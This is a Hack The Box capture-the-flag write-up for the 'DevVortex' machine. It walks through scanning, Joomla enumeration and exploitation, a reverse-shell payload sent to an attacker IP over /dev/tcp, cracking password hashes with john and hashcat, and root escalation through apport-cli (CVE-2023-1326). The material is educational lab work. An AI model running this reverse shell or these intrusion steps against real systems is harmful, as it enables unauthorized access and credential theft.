---
title: "DevVortex"
date: 2023-11-29T11:30:03+00:00
tags: ["web","windows","joomla", "apport-cli"]
categories: ["hackthebox"]
author: "0x0Pwn"
image: "/HTB/Devvortex.png"
comments: false
description: "This is a friendly linux machine that is vulnerable due a low version of Joomla db."
---

## Room Information

- Room name: DevVortex
- Difficulty level: Easy
- Room link: [https://app.hackthebox.com/machines/](https://app.hackthebox.com/machines/devvortex)

![Untitled](/HTB/Devvortex.png)

## Tools Used

- Nmap
- wfuzz
- searchsploit
- gobuster
- hascat
- john

## Port Scanning

Other room, other port scan.

```bash
map -p- -sS --open --min-rate 5000 -n -Pn -oG allPorts 10.10.11.242
```

![Untitled](/HTB/devvortex-1.png)

```bash
nmap -p 22,80 -sCV --min-rate 5000-n -Pn -oN filtered 10.10.11.242
```

![Untitled](/HTB/devvortex-2.png)

Showing this scan, we can say that the vulnerability 99% is inside the website… So lest discover info of port 80.

 

## Enumeration

First I did was a subdomain enumeration to discard things, and I found one (dev.devvortex.htb)..

```bash
gobuster vhost -u devvortex.htb -w /usr/share/wordlists/dirbuster/dns/subdomains-top1million-5000.txt --append-domain -t 40 -k
```

other posibiliti…

```bash
ffuf -w /usr/share/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.devvortex.htb" -u http://devvortex.htb/ -mc 200-299
```

![Untitled](/HTB/devvortex-3.png)

Then I did a directory enumeration to saw if the web contains something interesting. And I saw an administrator panel which was a loguin panel of a joomla database.

![Untitled](/HTB/devvortex-4.png)

Also I discovered this file which contained the joomla version. So first I did since saw this was searching a bypass or something for this db. And I found a lot of them. 

![Untitled](/HTB/devvortex-5.png)

## Exploiting

I used search sploit for searching for exploits and I use this below:

![Untitled](/HTB/devvortex-6.png)

Then I logged with the above credential and I had access to de db panel such as super user…

![Untitled](/HTB/devvortex-7.png)

I found this post on hacktricks, and I followed the guide. Then I gain access to the machine as ww-data 👹

[Joomla](https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-web/joomla)

![Untitled](/HTB/devvortex-8.png)

```bash
...?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.130/4444 0>&1'
```

![Untitled](/HTB/devvortex-9.png)

## Escalating Privileges

Then I throw a [`linpeas.sh`](http://linpeas.sh) instance and I show that there was a db running on the backend.. And I logged in using the lewis db credentials I got at first…

Then in the joomla db I found a table called ...._users that contained the ssh users and passwd hashed. So I start decoding them with hashcat and john:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

or 

```bash
hashcat -m 3200 -a 0 -w 4 hash /usr/share/wordlists/rockyou.txt
```

![Untitled](/HTB/devvortex-10.png)

So I’m actually user `logan` 👹

Then I enter by ssh to user logan…

First I always do is `sudo -l` and I saw this:

![Untitled](/HTB/devvortex-11.png)

The net thing I did was searching this program on google and throwing an instance ofr [`procmon.sh`](http://procmon.sh) to saw what procedures were running on the backend, and I found someone interesenting, related with apport-cli:

[CVE-2023-1326](https://launchpad.net/bugs/cve/CVE-2023-1326)

pd: [`procmon.sh`](http://procmon.sh) code 

```bash
#!/bin/bash

 old_process=$(ps -eo user,command | awk '!/procmon|kworker/ {print}')

 while true; do
        new_process=$(ps -eo user,command | awk '!/procmon|kworker/ {print}')
        diff <(echo "$old_process") <(echo "$new_process") | grep "[\>]" | grep -vE "procmon|awk|kworker"
        old_process=$new_process
 done
```

I saw that using a example comamnd like this → `sudo apport-cli -c xxx.crash` didn’t works:

![Untitled](/HTB/devvortex-12.png)

But I saw in a post of the above link that if you put `less` at the end of the command we can see unexpected working jejeje 

![Untitled](/HTB/devvortex-13.png)

[systemd 246 Local Root Privilege Escalation ≈ Packet Storm](https://packetstormsecurity.com/files/174130/systemd-246-Local-Root-Privilege-Escalation.html)

![Untitled](/HTB/devvortex-14.png)

Soo I did this and now I’m user root 👹
